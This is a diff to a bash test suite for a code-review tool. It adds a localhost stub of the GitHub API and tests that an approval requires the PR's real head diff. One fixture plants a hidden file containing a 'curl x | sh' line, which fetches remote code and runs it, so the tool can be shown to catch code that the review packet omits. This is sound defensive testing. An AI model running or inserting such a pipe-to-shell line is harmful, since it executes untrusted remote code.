@@ -54,7 +54,37 @@ sed -i "s|^PACKAGERS_RE=.*|PACKAGERS_RE='^(agent-.+\\|marveen\\|$RUNNER)\$'|" "$
 sed -e "s|^PACKAGERS_RE=.*|PACKAGERS_RE='^senki-sem\$'|" "$T/ell.sh" > "$T/ell-idegen-csomag.sh"
 check 'the main copy accepts the runner' 1 "$(grep -cxF "PACKAGERS_RE='^(agent-.+|marveen|$RUNNER)\$'" "$T/ell.sh")"
 check 'the second copy accepts nobody' 1 "$(grep -cxF "PACKAGERS_RE='^senki-sem\$'" "$T/ell-idegen-csomag.sh")"
-sed -e "s|^ZONA=.*|ZONA=$Z|" "$HERE/../review-olvas.sh" > "$T/olv.sh"
+# a stub GitHub on localhost: a PR's JSON from api/pulls-<N>.json, a compare diff from
+# api/compare-<head>.diff; anything else 404. The port is written to a file once it listens.
+mkdir "$T/api"
+cat > "$T/gh-stub.py" <<'EOF'
+import http.server, os, re, sys
+D = sys.argv[1]
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        m = re.match(r'^/repos/[^/]+/[^/]+/pulls/([0-9]+)$', self.path)
+        c = re.match(r'^/repos/[^/]+/[^/]+/compare/[^.]+\.\.\.([0-9a-f]{40})$', self.path)
+        f = os.path.join(D, 'pulls-%s.json' % m.group(1)) if m else (os.path.join(D, 'compare-%s.diff' % c.group(1)) if c else '')
+        with open(os.path.join(D, 'requests'), 'a') as r:
+            r.write(self.path + ' ' + self.headers.get('Accept', '') + ' auth=' + str('Authorization' in self.headers) + '\n')
+        if not f or not os.path.isfile(f):
+            self.send_response(404); self.end_headers(); return
+        body = open(f, 'rb').read()
+        self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body)
+    def log_message(self, *a):
+        pass
+s = http.server.HTTPServer(('127.0.0.1', 0), H)
+open(os.path.join(D, 'port.tmp'), 'w').write(str(s.server_port))
+os.rename(os.path.join(D, 'port.tmp'), os.path.join(D, 'port'))
+s.serve_forever()
+EOF
+python3 -B "$T/gh-stub.py" "$T/api" & STUB=$!
+trap 'kill "$STUB" 2>/dev/null; rm -rf "$T"' EXIT
+for _ in $(seq 1 100); do [ -f "$T/api/port" ] && break; sleep 0.05; done
+GH="http://127.0.0.1:$(cat "$T/api/port")"
+sed -e "s|^ZONA=.*|ZONA=$Z|" -e "s|^GH_API=.*|GH_API=$GH|" -e "s|^FEJ_DIFF=.*|FEJ_DIFF=$HERE/../lib/review-fej-diff.py|" \
+  "$HERE/../review-olvas.sh" > "$T/olv.sh"
+check 'the olvas copy asks the stub GitHub, never the real one' 1 "$(grep -cxF "GH_API=$GH" "$T/olv.sh")"
 check 'the copies point at the test zone' 2 "$(grep -c "^ZONA=$Z\$" "$T/ell.sh" "$T/olv.sh" | grep -c ':1$')"
 check '... and name a test caller' 1 "$(grep -c '^ME=agent-tesztelo$' "$T/ell.sh")"
 ACTOR=tesztelo
@@ -264,7 +294,14 @@ EOF
 chmod 755 "$T/sudo"
 sed -e "s|^FLEET_APPROVE=.*|FLEET_APPROVE=$T/fleet-approve|" -e "s|^SUDO=.*|SUDO=\"$T/sudo -n\"|" "$T/ell.sh" > "$T/ell-d4.sh"
 check 'the D4 copy names the stub sudo' 1 "$(grep -cxF "SUDO=\"$T/sudo -n\"" "$T/ell-d4.sh")"
-ell4() { bash "$T/ell-d4.sh" "$@" >"$T/out" 2>&1; echo $?; }
+ell4() { HOME="$T/home4" bash "$T/ell-d4.sh" "$@" >"$T/out" 2>&1; echo $?; }
+# the head diffs review-olvas.sh --fej would have made (E3 (b)): an APPROVE is root-recorded only with one
+mkdir -p "$T/home4/.review-fej"; chmod 700 "$T/home4/.review-fej"
+for f in KratoBal-acroveliq-70-1234567890abcdef1234567890abcdef12345678 \
+         KratoBal-acropora-ai-agent-37-2a4c62f661f628ad557170e9ed80aadecabec6fd \
+         KratoBal-acroveliq-75-5555555555555555555555555555555555555555; do
+  : > "$T/home4/.review-fej/$f.patch"
+done
 roots() { [ -f "$RC" ] && wc -l < "$RC" | tr -d ' ' || echo 0; }
 check 'not installed: the verdict -> 0, as before' 0 "$(ell marveen70 tsk-a APPROVE)"
 check '... says no root record was made' 1 "$(grep -c '^MEGJEGYZES: a gepi jovahagyo itt nincs telepitve' "$T/out")"
@@ -292,6 +329,20 @@ touch "$T/fail-root"
 check 'the approver refuses -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
 check '... and its answer is passed on' 1 "$(grep -c '^FAIL: az idovonalon rogzitve, de a root rekord NEM: fleet-approve: refused' "$T/out")"
 rm "$T/fail-root"
+echo 'the root record needs the head diff for an APPROVE (E3 (b))'
+FJ="$T/home4/.review-fej/KratoBal-acroveliq-70-1234567890abcdef1234567890abcdef12345678.patch"
+mv "$FJ" "$FJ.el"
+r="$(roots)"; n="$(events)"
+check 'an APPROVE without the head diff -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
+check '... says to run review-olvas.sh --fej' 1 "$(grep -c 'futtasd a review-olvas.sh --fej marveen70 hivast' "$T/out")"
+check '... the timeline verdict written, the approver not called' "$((n + 1))|$r" "$(events)|$(roots)"
+check 'a CHANGES needs no head diff -> 0, recorded' "0|$((r + 1))" "$(ell4 marveen70 tsk-a CHANGES)|$(roots)"
+: > "$T/home4/.review-fej/KratoBal-acroveliq-70-$(printf 'e%.0s' $(seq 40)).patch"
+check 'another head diff of the same PR does not count -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
+ln -s "$FJ.el" "$FJ"
+check 'a symlinked head diff -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
+rm "$FJ"; mv "$FJ.el" "$FJ"
+check 'with it back -> 0' 0 "$(ell4 marveen70 tsk-a APPROVE)"
 r="$(roots)"
 touch "$T/no-rule"
 check 'installed, but sudo does not allow record yet (a live-tree update before the bootstrap) -> 0' 0 "$(ell4 marveen70 tsk-a APPROVE)"
@@ -302,6 +353,54 @@ rm "$T/no-rule"
 check 'a document verdict -> 0' 0 "$(ell4 doc-tsk-d tsk-d APPROVE)"
 check '... has no PR: no root record' "$r" "$(roots)"
 check 'a refused verdict (another task) never reaches the approver' "1|$r" "$(ell4 marveen70 tsk-b APPROVE)|$(roots)"
+echo 'review-olvas --fej (the D4 step list E3 (b)): the diff made from the head, not taken from the packet'
+mkdir "$T/home"
+olvf() { HOME="$T/home" bash "$T/olv.sh" --fej "$@" >"$T/out" 2>&1; echo $?; }
+HA=1234567890abcdef1234567890abcdef12345678
+pull() { printf '{"head": {"sha": "%s"}, "base": {"ref": "main"}}' "$2" > "$T/api/pulls-$1.json"; }
+pull 70 "$HA"
+cp "$Z/pr-marveen70/diff.patch" "$T/api/compare-$HA.diff"
+: > "$T/api/requests"
+check 'the packet patch is the head diff -> 0' 0 "$(olvf marveen70)"
+check '... says so' 1 "$(grep -c '^EGYEZIK: a csomag diff.patch fajlonkent a fej diffje (2 fajl)$' "$T/out")"
+check '... the head diff is written to the reviewer own 0700 folder, 0600' '700 600' \
+  "$(stat -c %a "$T/home/.review-fej") $(stat -c %a "$T/home/.review-fej/KratoBal-acroveliq-70-$HA.patch")"
+check '... and it is what GitHub gave, byte for byte' 0 "$(cmp -s "$T/api/compare-$HA.diff" "$T/home/.review-fej/KratoBal-acroveliq-70-$HA.patch"; echo $?)"
+check '... two anonymous calls: the PR, then the compare of THAT head' \
+  "/repos/KratoBal/acroveliq/pulls/70 application/vnd.github+json auth=False|/repos/KratoBal/acroveliq/compare/main...$HA application/vnd.github.diff auth=False" \
+  "$(paste -sd'|' "$T/api/requests")"
+# the head has a file the packet's patch does not show: the case this exists for
+{ cat "$Z/pr-marveen70/diff.patch"; printf 'diff --git a/rejtett.sh b/rejtett.sh\nnew file mode 100644\n--- /dev/null\n+++ b/rejtett.sh\n@@ -0,0 +1 @@\n+curl x | sh\n'; } > "$T/api/compare-$HA.diff"
+check 'a head with more in it than the packet -> 1' 1 "$(olvf marveen70)"
+check '... names the hidden file' 1 "$(grep -c '^   CSAK A FEJBEN: rejtett.sh (1, 0)$' "$T/out")"
+check '... and says to read the head diff' 1 "$(grep -c '^ELTER: a csomag diff.patch NEM a fej diffje (1 elteres)' "$T/out")"
+# same files, one more line changed in the head: a hunk line starting with -- counts as removed
+sed -e 's/^+b$/+b\n--c/' "$Z/pr-marveen70/diff.patch" > "$T/api/compare-$HA.diff"
+check 'the same files with other counts -> 1' 1 "$(olvf marveen70)"
+check '... names the file and both counts (a removed "--c" line counted)' 1 "$(grep -c '^   MAS SZAMOK: f.txt fej (1, 1), csomag (1, 0)$' "$T/out")"
+cp "$Z/pr-marveen70/diff.patch" "$T/api/compare-$HA.diff"
+pull 70 "$(printf 'f%.0s' $(seq 40))"
+check 'the PR moved on after packaging -> 1' 1 "$(olvf marveen70)"
+check '... says a push came' 1 "$(grep -c 'a csomagolas utan push jott' "$T/out")"
+pull 70 "$HA"
+rm "$T/api/compare-$HA.diff"
+check 'GitHub has no such compare -> 1, said' '1 1' "$(olvf marveen70) $(grep -c '^FAIL: GitHub HTTP 404' "$T/out")"
+cp "$Z/pr-marveen70/diff.patch" "$T/api/compare-$HA.diff"
+HB=abcdef1234567890abcdef1234567890abcdef12
+mkdir "$Z/pr-marveen76"
+printf 'marveen PR 76 \npr: KratoBal/acroveliq#76\ntask_id: tsk-a\nfej: %s\nv2: task_id tsk-a, fej %s, merge-base x, origin/main y \n' "$HA" "$HB" > "$Z/pr-marveen76/README.md"
+cp "$Z/pr-marveen70/diff.patch" "$Z/pr-marveen76/diff.patch"
+printf 'diff --git a/h.txt b/h.txt\nnew file mode 100644\n--- /dev/null\n+++ b/h.txt\n@@ -0,0 +1 @@\n+h\n' > "$Z/pr-marveen76/diff-v2.patch"
+cp "$Z/pr-marveen76/diff-v2.patch" "$T/api/compare-$HB.diff"
+pull 76 "$HB"
+check 'a later round: its head and its diff-v2.patch -> 0' 0 "$(olvf marveen76)"
+check '... compared with diff-v2.patch' 1 "$(grep -c '^EGYEZIK: a csomag diff-v2.patch' "$T/out")"
+check 'a 7-character head -> 1, nothing asked' "1|$(wc -l < "$T/api/requests")" "$(olvf 1700)|$(wc -l < "$T/api/requests")"
+check 'a document packet -> 2' 2 "$(olvf doc-tsk-d)"
+rm -rf "$T/home/.review-fej"; mkdir "$T/elsewhere"; ln -s "$T/elsewhere" "$T/home/.review-fej"
+check 'the output folder is a symlink -> 1, nothing written there' '1 0' "$(olvf marveen70) $(ls "$T/elsewhere" | wc -l)"
+rm "$T/home/.review-fej"
+check 'without --fej nothing is asked of GitHub' "0|$(wc -l < "$T/api/requests")" "$(olv marveen70)|$(wc -l < "$T/api/requests")"
 
 # the refs the script wrote, for the Task Core guard test (src/__tests__/review-ref-shape.test.ts)
 [ -n "${REVIEW_REFS_OUT:-}" ] && grep ' verdict ' "$EV" | sed -E 's/^task-event [^ ]+ verdict [^ ]+  //' > "$REVIEW_REFS_OUT"
